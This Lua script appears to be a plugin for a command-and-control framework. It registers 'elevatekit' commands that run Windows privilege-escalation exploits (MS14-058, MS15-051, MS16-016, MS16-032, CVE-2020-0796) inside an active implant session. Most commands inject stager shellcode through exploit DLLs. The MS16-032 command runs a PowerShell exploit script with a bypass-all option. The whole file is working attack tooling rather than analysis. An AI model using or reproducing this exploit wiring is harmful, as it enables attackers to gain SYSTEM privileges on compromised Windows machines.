local elevate = {}
local elevate_dir = "ElevateKit/"
local function new_sac()
    local sac = new_sacrifice(0, false, false, false, "")
    return sac
end

-- start ms14-058
local function run_ms14_058(args)
    print("run_ms14_058")
    local session = active()
    local shellcode = self_stager(session)
    local arch = session.Os.Arch
    local dllpath = script_resource(elevate_dir .. "cve-2014-4113-dev" .. "." ..
                                        arch .. ".dll")
    print("running ms14-058")
    return dllspawn(session, dllpath, "", shellcode, "", false, 60, arch, "",
                    new_sac())
end
command("elevatekit:ms14-058", run_ms14_058, "elevatekit ms14-058", "T1068")

-- end ms14-058

-- start ms15-051
local function run_ms15_051(args)
    local session = active()
    local shellcode = self_stager(session)
    local arch = session.Os.Arch
    local dllpath = script_resource(elevate_dir .. "cve-2015-1701" .. "." ..
                                        arch .. ".dll")
    return dllspawn(session, dllpath, "", shellcode, "", false, 60, arch, "",
                    new_sac())
end
command("elevatekit:ms15-051", run_ms15_051, "elevatekit ms15-051", "T1068")
-- end ms15-051

-- start ms16-016
local function run_ms16_016(args)
    local session = active()
    local arch = session.Os.Arch
    if arch == "x64" then
        error("ms16-016 exploit is x86 only")
        return
    end
    local shellcode = self_stager(session)
    local dllpath = script_resource(elevate_dir .. "cve-2016-0051" .. "." ..
                                        arch .. ".dll")
    return dllspawn(session, dllpath, "", shellcode, "", false, 60, arch, "",
                    new_sac())
end
command("elevatekit:ms16-016", run_ms16_016, "elevatekit ms16-016", "T1068")
-- end ms16-016

-- start ms16-032
local function run_ms16_032(args)
    local session = active()
    local arch = session.Os.Arch
    local command = "Invoke-MS16032 -Command " .. args[1]
    local ps_script = script_resource(elevate_dir .. "Invoke-MS16032.ps1")
    return powerpick(session, ps_script, {command}, new_bypass_all())
end
command("elevatekit:ms16-032", run_ms16_032, "elevatekit ms16-032", "T1068")
-- end ms16-032

-- start cve_2020_0796
local function run_cve_2020_0796(args)
    session = active()
    arch = session.Os.Arch
    if arch == "x32" then
        error("cve-2020-0796 exploit is x64 only")
        return
    end
    local shellcode = self_stager(session)
    local dllpath = script_resource(elevate_dir .. "cve-2020-0796" .. "." ..
                                        arch .. ".dll")
    return dllspawn(session, dllpath, "", shellcode, "", false, 60, arch, "",
                    new_sac())
end
command("elevatekit:cve-2020-0796", run_cve_2020_0796,
        "elevatekit cve-2020-0796", "T1068")
-- end cve_2020_0796
